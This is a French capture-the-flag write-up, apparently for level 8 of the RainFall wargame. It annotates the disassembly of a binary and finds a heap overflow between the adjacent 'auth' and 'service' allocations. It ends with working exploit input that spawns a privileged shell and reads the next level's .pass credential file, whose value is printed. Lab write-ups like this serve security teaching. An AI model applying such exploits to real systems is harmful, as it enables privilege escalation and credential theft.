@@ -1,0 +1,241 @@
+Le binaire ressemble à une succession d'instruction traitée dans une boucle infinie
+```asm
+08048564 <main>:
+ 8048564:       55                      push   ebp
+ 8048565:       89 e5                   mov    ebp,esp
+ 8048567:       57                      push   edi
+ 8048568:       56                      push   esi
+ 8048569:       83 e4 f0                and    esp,0xfffffff0
+ 804856c:       81 ec a0 00 00 00       sub    esp,0xa0
+
+ // Début de la boucle infinie:
+
+ 8048572:       eb 01                   jmp    8048575 <main+0x11>
+ 8048574:       90                      nop
+
+ // Préparation de printf:
+
+(gdb) x/s 0x8049ab0
+0x8049ab0 <service>:     ""
+(gdb) x/s 0x8049aac
+0x8049aac <auth>:        ""
+(gdb) x/s 0x8048810
+0x8048810:       "%p, %p \n"
+(gdb) r
+Starting program: /home/user/level8/level8
+(nil), (nil)
+
+// Nous avons donc 2 pointeurs auth et service egaux à NULL:
+
+ 8048575:       8b 0d b0 9a 04 08       mov    ecx,DWORD PTR ds:0x8049ab0
+ 804857b:       8b 15 ac 9a 04 08       mov    edx,DWORD PTR ds:0x8049aac
+ 8048581:       b8 10 88 04 08          mov    eax,0x8048810
+ 8048586:       89 4c 24 08             mov    DWORD PTR [esp+0x8],ecx
+ 804858a:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
+ 804858e:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048591:       e8 7a fe ff ff          call   8048410 <printf@plt>
+
+ // stdin est chargé comme argument de fgets:
+
+ (gdb) x/s 0x8049a80
+0x8049a80 <stdin@@GLIBC_2.0>:    ""
+
+ 8048596:       a1 80 9a 04 08          mov    eax,ds:0x8049a80
+ 804859b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+
+ // Puis 128 octets puis le buffer situé à $esp+0x20 donc d'une taille de 128 à priori:
+
+ 804859f:       c7 44 24 04 80 00 00    mov    DWORD PTR [esp+0x4],0x80
+ 80485a6:       00
+ 80485a7:       8d 44 24 20             lea    eax,[esp+0x20]
+ 80485ab:       89 04 24                mov    DWORD PTR [esp],eax
+ 80485ae:       e8 8d fe ff ff          call   8048440 <fgets@plt>
+
+// test eax,eax équivaut à un cmp eax,0 on teste le retour de fgets sur NULL et on quitte si c'est le cas:
+
+ 80485b3:       85 c0                   test   eax,eax
+ 80485b5:       0f 84 71 01 00 00       je     804872c <main+0x1c8>
+
+ // cette instruction correspond à un strncmp du retour de fgets sur la str en **0x8048819**: "auth " sur 5 octets
+
+ 80485bb:       8d 44 24 20             lea    eax,[esp+0x20]
+ 80485bf:       89 c2                   mov    edx,eax
+ 80485c1:       b8 19 88 04 08          mov    eax,0x8048819
+ 80485c6:       b9 05 00 00 00          mov    ecx,0x5
+ 80485cb:       89 d6                   mov    esi,edx
+ 80485cd:       89 c7                   mov    edi,eax
+ 80485cf:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 80485d1:       0f 97 c2                seta   dl
+ 80485d4:       0f 92 c0                setb   al
+ 80485d7:       89 d1                   mov    ecx,edx
+ 80485d9:       28 c1                   sub    cl,al
+ 80485db:       89 c8                   mov    eax,ecx
+ 80485dd:       0f be c0                movsx  eax,al
+ 80485e0:       85 c0                   test   eax,eax
+
+// si strncmp != de 0 alors on va à l'instruction **0x8048642**
+
+ 80485e2:       75 5e                   jne    8048642 <main+0xde>
+
+// sinon on appelle malloc de 4 octets dont le retour est stocké dans 0x8049aac, soit le pointeur **auth**
+// le premier octet est mis a 0x0
+
+ 80485e4:       c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
+ 80485eb:       e8 80 fe ff ff          call   8048470 <malloc@plt>
+ 80485f0:       a3 ac 9a 04 08          mov    ds:0x8049aac,eax
+ 80485f5:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
+ 80485fa:       c7 00 00 00 00 00       mov    DWORD PTR [eax],0x0
+
+// on ajoute 5 octets au buffer et on fait un strlen à partir de buffer + 5:
+
+ 8048600:       8d 44 24 20             lea    eax,[esp+0x20]
+ 8048604:       83 c0 05                add    eax,0x5
+ 8048607:       c7 44 24 1c ff ff ff    mov    DWORD PTR [esp+0x1c],0xffffffff
+ 804860e:       ff
+ 804860f:       89 c2                   mov    edx,eax
+ 8048611:       b8 00 00 00 00          mov    eax,0x0
+ 8048616:       8b 4c 24 1c             mov    ecx,DWORD PTR [esp+0x1c]
+ 804861a:       89 d7                   mov    edi,edx
+ 804861c:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
+ 804861e:       89 c8                   mov    eax,ecx
+ 8048620:       f7 d0                   not    eax
+ 8048622:       83 e8 01                sub    eax,0x1
+
+ // On compare le résultat de strlen à 0x1e, soit 30 et si la len est strictement supérieure, on passe à l'instruction 0x8048642
+ // sinon, on fait un strcpy de **buffer + 5** vers **auth**:
+
+ 8048625:       83 f8 1e                cmp    eax,0x1e
+ 8048628:       77 18                   ja     8048642 <main+0xde>
+ 804862a:       8d 44 24 20             lea    eax,[esp+0x20]
+ 804862e:       8d 50 05                lea    edx,[eax+0x5]
+ 8048631:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
+ 8048636:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
+ 804863a:       89 04 24                mov    DWORD PTR [esp],eax
+ 804863d:       e8 1e fe ff ff          call   8048460 <strcpy@plt>
+
+// Ici on a une autre instruction évaluée par un strncmp: "reset". Si strncmp != 0 alors on va à l'instruction **0x8048678**
+
+ 8048642:       8d 44 24 20             lea    eax,[esp+0x20]
+ 8048646:       89 c2                   mov    edx,eax
+ 8048648:       b8 1f 88 04 08          mov    eax,0x804881f
+ 804864d:       b9 05 00 00 00          mov    ecx,0x5
+ 8048652:       89 d6                   mov    esi,edx
+ 8048654:       89 c7                   mov    edi,eax
+ 8048656:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 8048658:       0f 97 c2                seta   dl
+ 804865b:       0f 92 c0                setb   al
+ 804865e:       89 d1                   mov    ecx,edx
+ 8048660:       28 c1                   sub    cl,al
+ 8048662:       89 c8                   mov    eax,ecx
+ 8048664:       0f be c0                movsx  eax,al
+ 8048667:       85 c0                   test   eax,eax
+ 8048669:       75 0d                   jne    8048678 <main+0x114>
+
+// si on entre dans le bloc "reset" nous avons juste un free de **auth**
+
+ 804866b:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
+ 8048670:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048673:       e8 a8 fd ff ff          call   8048420 <free@plt>
+
+// Ici on a une autre instruction évaluée par un strncmp: "servic". Si strncmp != 0 alors on va à l'instruction **0x80486b5**
+// on constate une irrégularité dans le code car le strncmp est fait sur 6 octets alors que service en comprends 7 et la str pris en compte ensuite est bien buffer + 7
+
+ 8048678:       8d 44 24 20             lea    eax,[esp+0x20]
+ 804867c:       89 c2                   mov    edx,eax
+ 804867e:       b8 25 88 04 08          mov    eax,0x8048825
+ 8048683:       b9 06 00 00 00          mov    ecx,0x6
+ 8048688:       89 d6                   mov    esi,edx
+ 804868a:       89 c7                   mov    edi,eax
+ 804868c:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 804868e:       0f 97 c2                seta   dl
+ 8048691:       0f 92 c0                setb   al
+ 8048694:       89 d1                   mov    ecx,edx
+ 8048696:       28 c1                   sub    cl,al
+ 8048698:       89 c8                   mov    eax,ecx
+ 804869a:       0f be c0                movsx  eax,al
+ 804869d:       85 c0                   test   eax,eax
+ 804869f:       75 14                   jne    80486b5 <main+0x151>
+
+// si on entre dans le bloc service, il y a un appel de strdup de buffer + 7. Le retour de strdup est stocké dans **service**.
+// L'appel a malloc renverra une adresse mémoire contigüe à l'autre malloc. Puisque les adresses mallocées se suivent, il est possible d'écrire en dehors des buffers. Puisqu'il y a un strlen à 30, on suppose que la limite est supérieure à 30.
+
+ 80486a1:       8d 44 24 20             lea    eax,[esp+0x20]
+ 80486a5:       83 c0 07                add    eax,0x7
+ 80486a8:       89 04 24                mov    DWORD PTR [esp],eax
+ 80486ab:       e8 80 fd ff ff          call   8048430 <strdup@plt>
+ 80486b0:       a3 b0 9a 04 08          mov    ds:0x8049ab0,eax
+
+// Ici on a une autre instruction évaluée par un strncmp: "login". Si strncmp != 0 alors on va à l'instruction **0x8048574**
+
+ 80486b5:       8d 44 24 20             lea    eax,[esp+0x20]
+ 80486b9:       89 c2                   mov    edx,eax
+ 80486bb:       b8 2d 88 04 08          mov    eax,0x804882d
+ 80486c0:       b9 05 00 00 00          mov    ecx,0x5
+ 80486c5:       89 d6                   mov    esi,edx
+ 80486c7:       89 c7                   mov    edi,eax
+ 80486c9:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 80486cb:       0f 97 c2                seta   dl
+ 80486ce:       0f 92 c0                setb   al
+ 80486d1:       89 d1                   mov    ecx,edx
+ 80486d3:       28 c1                   sub    cl,al
+ 80486d5:       89 c8                   mov    eax,ecx
+ 80486d7:       0f be c0                movsx  eax,al
+ 80486da:       85 c0                   test   eax,eax
+ 80486dc:       0f 85 92 fe ff ff       jne    8048574 <main+0x10>
+
+// si on rentre dans le bloc login, auth est chargé dans eax et la valeur situé à eax + 0x20 est inspectée, ce qui revient à inspecter auth[32]
+// si elle est égale à 0, alors nous entrons dans le bloc system avec comme paramètre "/bin/sh":
+
+ 80486e2:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
+ 80486e7:       8b 40 20                mov    eax,DWORD PTR [eax+0x20]
+ 80486ea:       85 c0                   test   eax,eax
+ 80486ec:       74 11                   je     80486ff <main+0x19b>
+ 80486ee:       c7 04 24 33 88 04 08    mov    DWORD PTR [esp],0x8048833
+ 80486f5:       e8 86 fd ff ff          call   8048480 <system@plt>
+ 80486fa:       e9 75 fe ff ff          jmp    8048574 <main+0x10>
+
+// sinon un appel à fwrite est fait: fwrite("Password:\n", 1, 10, stdout)
+
+ 80486ff:       a1 a0 9a 04 08          mov    eax,ds:0x8049aa0
+ 8048704:       89 c2                   mov    edx,eax
+ 8048706:       b8 3b 88 04 08          mov    eax,0x804883b
+ 804870b:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
+ 804870f:       c7 44 24 08 0a 00 00    mov    DWORD PTR [esp+0x8],0xa
+ 8048716:       00
+ 8048717:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
+ 804871e:       00
+ 804871f:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048722:       e8 29 fd ff ff          call   8048450 <fwrite@plt>
+
+// Les jump à l'instruction 0x8048574 renvoient au début du main et la boucle se poursuit.
+
+ 8048727:       e9 48 fe ff ff          jmp    8048574 <main+0x10>
+ 804872c:       90                      nop
+ 804872d:       b8 00 00 00 00          mov    eax,0x0
+ 8048732:       8d 65 f8                lea    esp,[ebp-0x8]
+ 8048735:       5e                      pop    esi
+ 8048736:       5f                      pop    edi
+ 8048737:       5d                      pop    ebp
+ 8048738:       c3                      ret
+```
+
+Conclusion:
+- il faut lancer l'instruction **auth** avec un str de longueure inférieur ou égal à 30
+- puis l'instruction **service** avec un str dont la longueure + la longueure de auth >= 32 pour écrire à auth[32]: un auth avec 4 octets: "bob\n" puis un service de 28 octets: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+- puis taper login, nous aurons accès à /bin/sh:
+
+```bash
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth bob
+0x804a008, (nil)
+
+serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018
+login
+$ id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+Bim
